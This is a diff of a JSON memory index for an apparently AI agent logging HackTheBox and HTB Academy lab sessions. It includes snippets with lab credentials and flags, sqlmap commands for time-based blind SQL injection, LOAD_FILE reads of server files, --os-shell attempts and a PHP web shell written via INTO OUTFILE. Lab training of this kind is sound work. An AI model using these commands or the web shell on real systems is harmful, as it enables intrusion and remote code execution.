@@ -1,6 +1,6 @@
 {
   "version": 1,
-  "updatedAt": "2026-05-12T07:40:22.875Z",
+  "updatedAt": "2026-05-12T12:06:59.950Z",
   "entries": {
     "memory:memory/2026-04-09.md:4:4": {
       "key": "memory:memory/2026-04-09.md:4:4",
@@ -23946,13 +23946,13 @@
       "endLine": 42,
       "source": "memory",
       "snippet": "**htb_document_progress v2.1.1:** Fixed path resolution bug. Now uses `realpath` to output absolute BOX_DIR paths. Subagent MUST use absolute paths provided by document.sh to avoid \"file not found\" errors in different execution contexts. ### HTB Box: Precious - IN PROGRESS - IP: 10.129.228.98 - Services: SSH (22), HTTP/nginx (80) + Phusion Passenger + Ruby - Web App: PDF conversion service from URL input - Attack Surface: SSRF, command injection, file read via PDF generation ### Key Techniques - Time-based blind SQLi: requires TIME tuning (used 3s for stable extraction) - PATH hijacking: identify privileged processes using unqualified commands - PAM exploitation: MOTD scripts run as root o",
-      "recallCount": 11,
+      "recallCount": 13,
       "dailyCount": 0,
       "groundedCount": 0,
-      "totalScore": 5.391464164853096,
+      "totalScore": 6.388376125693321,
       "maxScore": 0.5162069708108902,
       "firstRecalledAt": "2026-04-14T04:09:42.295Z",
-      "lastRecalledAt": "2026-05-12T05:55:50.888Z",
+      "lastRecalledAt": "2026-05-12T12:06:59.950Z",
       "queryHashes": [
         "d8f513267e39",
         "c39fe5ea79f0",
@@ -23964,7 +23964,9 @@
         "949e16e86f1e",
         "4451a1fa1e6b",
         "5deb5ba1ae91",
-        "709c320908e7"
+        "709c320908e7",
+        "502a7d7cb841",
+        "af66f543a6d1"
       ],
       "recallDays": [
         "2026-04-14",
@@ -28988,13 +28990,13 @@
       "endLine": 215,
       "source": "memory",
       "snippet": "- Candidate: **htb_document_progress v2.1.1:** Fixed path resolution bug. Now uses `realpath` to output absolute BOX_DIR paths. Subagent MUST use absolute paths provided by document.sh to avoid \"file not found\" errors in different execution contexts. ### HTB Box: Precious - IN PROGRESS - IP: 10.129.228.98 - Services: SSH (22), HTTP/nginx (80) + Phusion Passenger + Ruby - Web App: PDF conversion service from URL input - Attack Surface: SSRF, command injection, file read via PDF generation ### Key Techniques - Time-based blind SQLi: requires TIME tuning (used 3s for stable extraction) - PATH hijacking: identify privileged processes using unqualified commands - PAM exploitation: MOTD scripts ru",
-      "recallCount": 20,
+      "recallCount": 21,
       "dailyCount": 0,
       "groundedCount": 0,
-      "totalScore": 8.986433941125867,
+      "totalScore": 9.475056439638134,
       "maxScore": 0.5132884711027145,
       "firstRecalledAt": "2026-04-18T02:48:40.254Z",
-      "lastRecalledAt": "2026-05-12T05:56:11.702Z",
+      "lastRecalledAt": "2026-05-12T10:50:54.112Z",
       "queryHashes": [
         "b5ebadcf557c",
         "42b4ac8dd856",
@@ -29007,7 +29009,8 @@
         "2667a63a7ca2",
         "709c320908e7",
         "459d38c991f2",
-        "2c66baedb29a"
+        "2c66baedb29a",
+        "502a7d7cb841"
       ],
       "recallDays": [
         "2026-04-18",
@@ -66323,19 +66326,20 @@
       "endLine": 43,
       "source": "memory",
       "snippet": "# 2026-04-28 — Daily Log ## HTB Academy: AD Enumeration Attacks — Part II (Skills Assessment) **Session Start:** ~22:00 (Asia/Manila) **Status:** IN PROGRESS — Q1/Q2 complete, advancing toward Q3-Q12 **Next Session:** Continue from smbclient/MS01 enumeration ### Target Environment - **Attack Host:** Parrot Linux VM at `10.129.83.248` / `172.16.7.240` - **Domain:** INLANEFREIGHT.LOCAL - **Subnet:** 172.16.6.0/23 (internal network via `ens224`) ### Network Map Discovered | Host | IP | Open Ports | Notes | |------|-----|------------|-------| | DC01 | 172.16.7.3 | 53, 135, 139, 445 | SMB signing **required** | | MS01 | 172.16.7.50 | 135, 139, 445, **3389** | SMB signing **not required** | |",
-      "recallCount": 5,
+      "recallCount": 6,
       "dailyCount": 0,
       "groundedCount": 0,
-      "totalScore": 2.5044021233916283,
+      "totalScore": 2.996453605592251,
       "maxScore": 0.5564876720309258,
       "firstRecalledAt": "2026-04-30T03:43:29.058Z",
-      "lastRecalledAt": "2026-05-11T23:22:08.864Z",
+      "lastRecalledAt": "2026-05-12T12:06:52.759Z",
       "queryHashes": [
         "e68056f39a88",
         "28018ed1f989",
         "7b8b821d45d1",
         "4451a1fa1e6b",
-        "32f64802b04a"
+        "32f64802b04a",
+        "0b6f8f39c9fa"
       ],
       "recallDays": [
         "2026-04-30",
@@ -75314,19 +75318,21 @@
       "endLine": 36,
       "source": "memory",
       "snippet": "# Neo — Daily Memory — 2026-04-30 ## HTB Academy: AD Enumeration & Attacks — Part II (Skills Assessment) ### Part II Progress Summary | Q | Question | Status | Notes | |---|----------|--------|-------| | 1 | User account obtained from Responder | ✅ | `AB920` | | 2 | Password | ✅ | `weasal` (cracked from NTLMv2 hash) | | 3 | Submit flag.txt on MS01 | ✅ | `aud1t_gr0up_m3mbersh1ps!` | | 4 | Common method to obtain weak creds for another user | ✅ | **Password spraying** via `DomainPasswordSpray` | | 5 | Another user's credentials | ✅ | `BR086:Welcome1` | | 6 | MSSQL connection string with cleartext password | ⏳ | Connection string search on MS01 found only generic .NET defaults | | 7 | Submit",
-      "recallCount": 2,
+      "recallCount": 3,
       "dailyCount": 0,
       "groundedCount": 0,
-      "totalScore": 0.9631476908922195,
-      "maxScore": 0.4924729496240616,
+      "totalScore": 1.4568857312202452,
+      "maxScore": 0.49373804032802576,
       "firstRecalledAt": "2026-05-09T02:36:26.128Z",
-      "lastRecalledAt": "2026-05-09T02:38:20.089Z",
+      "lastRecalledAt": "2026-05-12T12:06:52.759Z",
       "queryHashes": [
         "28018ed1f989",
-        "9015df718ada"
+        "9015df718ada",
+        "0b6f8f39c9fa"
       ],
       "recallDays": [
-        "2026-05-09"
+        "2026-05-09",
+        "2026-05-12"
       ],
       "conceptTags": [
         "flag.txt",
@@ -76231,15 +76237,14 @@
       "endLine": 40,
       "source": "memory",
       "snippet": "# Neo — Daily Memory — 2026-05-09 ## HTB Academy: SQL Injection Fundamentals — Skills Assessment **Status:** Planning phase. Victor stepping out; initial recon + attack plan prepared for execution. **Target:** `https://154.57.164.64:31180/login.php` **Approach:** Black-box SQL injection assessment **Proxy:** Caido (Burp alternative) --- ### Assessment Objectives | Q | Question | Approach | |---|----------|----------| | 1 | Password hash for user `admin` | SQLi data extraction — enumerate tables, dump user creds | | 2 | Root path of web application | SQLi `LOAD_FILE` / error messages / `phpinfo` / RCE discovery | | 3 | RCE + contents of `/flag_XXXXXX.txt` | SQLi → file write shell OR st",
-      "recallCount": 32,
+      "recallCount": 34,
       "dailyCount": 0,
       "groundedCount": 0,
-      "totalScore": 17.344831694263497,
+      "totalScore": 18.40167735328106,
       "maxScore": 0.8404299540150534,
       "firstRecalledAt": "2026-05-10T14:30:09.097Z",
-      "lastRecalledAt": "2026-05-12T07:40:17.983Z",
+      "lastRecalledAt": "2026-05-12T12:06:52.759Z",
       "queryHashes": [
-        "b6f3857108b5",
         "2ed3a0001b00",
         "a6d7ae909b5f",
         "1988aef30c35",
@@ -76269,7 +76274,9 @@
         "2667a63a7ca2",
         "709c320908e7",
         "430da753a165",
-        "e191727f076c"
+        "e191727f076c",
+        "82646299cdaa",
+        "0b6f8f39c9fa"
       ],
       "recallDays": [
         "2026-05-10",
@@ -76601,6 +76608,213 @@
         "sender-id",
         "status",
         "staged"
+      ]
+    },
+    "memory:memory/2026-05-09.md:392:429": {
+      "key": "memory:memory/2026-05-09.md:392:429",
+      "path": "memory/2026-05-09.md",
+      "startLine": 392,
+      "endLine": 429,
+      "source": "memory",
+      "snippet": "sqlmap ... --sql-query=\"SELECT LOAD_FILE('/srv/www/html/index.php')\" ``` **Step 3 — Once web root found, RCE via:** ```bash sqlmap ... --os-shell # OR manual: sqlmap ... --sql-query=\"SELECT '<?php system(\\$_GET[\\\"cmd\\\"]); ?>' INTO OUTFILE '/found/web/root/shell.php'\" ``` --- ## Phase 7 — Extended Q2 Extraction — Nginx Config Fragments — 2026-05-12 ### Context Continued `LOAD_FILE('/etc/nginx/sites-enabled/default')` extraction on `154.57.164.76:31784`. Time-based blind with `--time-sec=2`. ### Fragments Successfully Extracted From the partial config read before special characters broke extraction: | Fragment | Likely Full Text | |----------|------------------| | `r_na` + `me` | `server",
+      "recallCount": 10,
+      "dailyCount": 0,
+      "groundedCount": 0,
+      "totalScore": 5.510868562017232,
+      "maxScore": 0.8251940093977752,
+      "firstRecalledAt": "2026-05-12T10:08:17.306Z",
+      "lastRecalledAt": "2026-05-12T11:46:55.241Z",
+      "queryHashes": [
+        "445b16f53ffd",
+        "a6db946be921",
+        "502a7d7cb841",
+        "825f696f0d9e",
+        "7dba02bdcdf7",
+        "417f114e7c20",
+        "82646299cdaa",
+        "42c68a6243e5",
+        "16173a0bc3d5",
+        "76ae4bf7a28a"
+      ],
+      "recallDays": [
+        "2026-05-12"
+      ],
+      "conceptTags": [
+        "sql-query",
+        "load-file",
+        "srv/www/html/index.php",
+        "os-shell",
+        "found/web/root/shell.php",
+        "etc/nginx/sites-enabled/default",
+        "154.57.164.76",
+        "time-based"
+      ]
+    },
+    "memory:memory/2026-05-09.md:445:486": {
+      "key": "memory:memory/2026-05-09.md:445:486",
+      "path": "memory/2026-05-09.md",
+      "startLine": 445,
+      "endLine": 486,
+      "source": "memory",
+      "snippet": "- HTTPS only (port 443) - App name: `chattr` ### Assessment Progress Summary (Updated) | Question | Status | Notes | |----------|--------|-------| | Q1 — admin password hash | ✅ COMPLETE | `$argon2i$...` hash extracted; cracking abandoned | | Q2 — web root path | 🔄 In Progress | Fragments suggest `root /...chattr`; exact prefix unknown | | Q3 — RCE + flag | ⏳ Pending | `--os-shell` or `INTO OUTFILE` once root confirmed | ### Next Session Plan (When New Box IP Available) **Option 1 — Login sqlmap (2-3 min):** ```bash sqlmap -u \"https://<NEW_IP>:<NEW_PORT>/api/login.php\" \\ --data='username=admin&password=***' \\ -p username,password --batch --level=5 --risk=3 ``` **Option 2 — Targeted",
+      "recallCount": 5,
+      "dailyCount": 0,
+      "groundedCount": 0,
+      "totalScore": 2.7629377458478936,
+      "maxScore": 0.7829769376899729,
+      "firstRecalledAt": "2026-05-12T10:08:17.306Z",
+      "lastRecalledAt": "2026-05-12T11:31:12.657Z",
+      "queryHashes": [
+        "445b16f53ffd",
+        "a6db946be921",
+        "502a7d7cb841",
+        "825f696f0d9e",
+        "16173a0bc3d5"
+      ],
+      "recallDays": [
+        "2026-05-12"
+      ],
+      "conceptTags": [
+        "os-shell",
+        "2-3",
+        "new-ip",
+        "new-port",
+        "api/login.php",
+        "https",
+        "only",
+        "app"
+      ]
+    },
+    "memory:memory/2026-05-09.md:425:453": {
+      "key": "memory:memory/2026-05-09.md:425:453",
+      "path": "memory/2026-05-09.md",
+      "startLine": 425,
+      "endLine": 453,
+      "source": "memory",
+      "snippet": "| ` ssl_cert` + `ifi` + `c` + `ate_key /etc/ss` | `ssl_certificate_key /etc/ssl/...` | ### Key Finding The web root directive appears to be in the format `root /...chattr` based on the `ot/c` + `hattr` fragments. The exact prefix (`/var/www/`, `/usr/share/nginx/html/`, `/srv/`, etc.) was cut off by extraction errors. ### Why Extraction Keeps Failing - Time-based blind extracts **one character at a time** via binary search - When sqlmap hits special/non-ASCII bytes (e.g., `\\xae`, `\\x7f`), the comparison logic breaks - sqlmap retries with escalating delays (2s → 3s → 4s → ... → timeout) - After enough failures, the **box times out** (`CRITICAL: can't establish SSL connections`) ### Attempte",
+      "recallCount": 2,
+      "dailyCount": 0,
+      "groundedCount": 0,
+      "totalScore": 1.0151417672634124,
+      "maxScore": 0.51000397503376,
+      "firstRecalledAt": "2026-05-12T10:28:53.068Z",
+      "lastRecalledAt": "2026-05-12T11:31:12.657Z",
+      "queryHashes": [
+        "a6db946be921",
+        "16173a0bc3d5"
+      ],
+      "recallDays": [
+        "2026-05-12"
+      ],
+      "conceptTags": [
+        "ssl-cert",
+        "ate-key",
+        "etc/ss",
+        "ssl-certificate-key",
+        "etc/ssl",
+        "ot/c",
+        "var/www",
+        "usr/share/nginx/html"
+      ]
+    },
+    "memory:memory/2026-05-09.md:353:376": {
+      "key": "memory:memory/2026-05-09.md:353:376",
+      "path": "memory/2026-05-09.md",
+      "startLine": 353,
+      "endLine": 376,
+      "source": "memory",
+      "snippet": "| 2 | `SELECT LOAD_FILE('/etc/nginx/nginx.conf')` | **Partial success** — got `user www-data; worker_processes auto; pid /run/nginx.pid; error_log /var/log/nginx/error.log; include /etc/nginx/modules-enabled/*.conf; events { worker_connections 76` before special chars (`\\xae`) broke extraction | | 3 | `SELECT LOAD_FILE('/etc/nginx/sites-enabled/default')` | **Partial success** — got `server { lis`, `ten 443 ssl;`, ` serve` before special chars broke extraction | ### Key Observations - **`LOAD_FILE` works** — MySQL has file read access - **Special characters break time-based blind** — non-printable bytes (`\\xae`, etc.) cause sqlmap to retry with escalating delays until timeout - **Nginx conf",
+      "recallCount": 4,
+      "dailyCount": 0,
+      "groundedCount": 0,
+      "totalScore": 1.8847148030996321,
+      "maxScore": 0.49464214146137236,
+      "firstRecalledAt": "2026-05-12T10:28:53.068Z",
+      "lastRecalledAt": "2026-05-12T11:31:21.457Z",
+      "queryHashes": [
+        "a6db946be921",
+        "65b9848a8e4d",
+        "16173a0bc3d5",
+        "2a0794c0ff5c"
+      ],
+      "recallDays": [
+        "2026-05-12"
+      ],
+      "conceptTags": [
+        "load-file",
+        "etc/nginx/nginx.conf",
+        "www-data",
+        "worker-processes",
+        "run/nginx.pid",
+        "error-log",
+        "var/log/nginx/error.log",
+        "etc/nginx/modules-enabled"
+      ]
+    },
+    "memory:memory/2026-05-09.md:368:406": {
+      "key": "memory:memory/2026-05-09.md:368:406",
+      "path": "memory/2026-05-09.md",
+      "startLine": 368,
+      "endLine": 406,
+      "source": "memory",
+      "snippet": "- Time-based blind extracts data **one character at a time** via binary search - When it hits a special/non-ASCII byte, the comparison logic breaks - sqlmap retries with longer delays, eventually timing out - **Fix:** Use `SUBSTRING()` + `LOCATE()` to extract only known-safe ASCII text (like `root` directive) ### Next Session Plan **Step 1 — Try login sqlmap** (2-3 min): ```bash sqlmap -u \"https://<NEW_IP>:<NEW_PORT>/api/login.php\" \\ --data='username=admin&password=test123' \\ -p username,password \\ --batch --level=5 --risk=3 ``` Rationale: Our manual payloads may have missed `')` wrapper on login too. sqlmap will test all structures. **Step 2 — If login clean, return to register wit",
+      "recallCount": 5,
+      "dailyCount": 0,
+      "groundedCount": 0,
+      "totalScore": 2.3438084423542023,
+      "maxScore": 0.48202446699142454,
+      "firstRecalledAt": "2026-05-12T10:28:53.068Z",
+      "lastRecalledAt": "2026-05-12T11:31:21.457Z",
+      "queryHashes": [
+        "a6db946be921",
+        "7dba02bdcdf7",
+        "65b9848a8e4d",
+        "16173a0bc3d5",
+        "2a0794c0ff5c"
+      ],
+      "recallDays": [
+        "2026-05-12"
+      ],
+      "conceptTags": [
+        "time-based",
+        "special/non-ascii",
+        "known-safe",
+        "2-3",
+        "new-ip",
+        "new-port",
+        "api/login.php",
+        "time"
+      ]
+    },
+    "memory:memory/2026-05-09.md:321:355": {
+      "key": "memory:memory/2026-05-09.md:321:355",
+      "path": "memory/2026-05-09.md",
+      "startLine": 321,
+      "endLine": 355,
+      "source": "memory",
+      "snippet": "```bash # Q2 — Web root path sqlmap -u \"https://<NEW_IP>:<NEW_PORT>/api/register.php\" \\ --data='username=test&password=***&repeatPassword=test123&invitationCode=abcd-efgh-1234' \\ -p invitationCode --batch --sql-query=\"SELECT @@basedir\" # Q3 — OS shell attempt sqlmap -u \"https://<NEW_IP>:<NEW_PORT>/api/register.php\" \\ --data='username=test&password=***&repeatPassword=test123&invitationCode=abcd-efgh-1234' \\ -p invitationCode --batch --os-shell ``` ### Status **✅ Q1 COMPLETE. Q2/Q3 ready for execution on next session. John cracking in background.** --- ## Phase 6 — Q2 Attempts — Web Root Discovery — 2026-05-12 ### Target **IP:** `154.57.164.76:31784` | **Endpoint:** `/api/register",
+      "recallCount": 1,
+      "dailyCount": 0,
+      "groundedCount": 0,
+      "totalScore": 0.46403665542602535,
+      "maxScore": 0.46403665542602535,
+      "firstRecalledAt": "2026-05-12T10:51:18.343Z",
+      "lastRecalledAt": "2026-05-12T10:51:18.343Z",
+      "queryHashes": [
+        "7dba02bdcdf7"
+      ],
+      "recallDays": [
+        "2026-05-12"
+      ],
+      "conceptTags": [
+        "new-ip",
+        "new-port",
+        "api/register.php",
+        "abcd-efgh-1234",
+        "sql-query",
+        "os-shell",
+        "q2/q3",
+        "154.57.164.76"
       ]
     }
   }
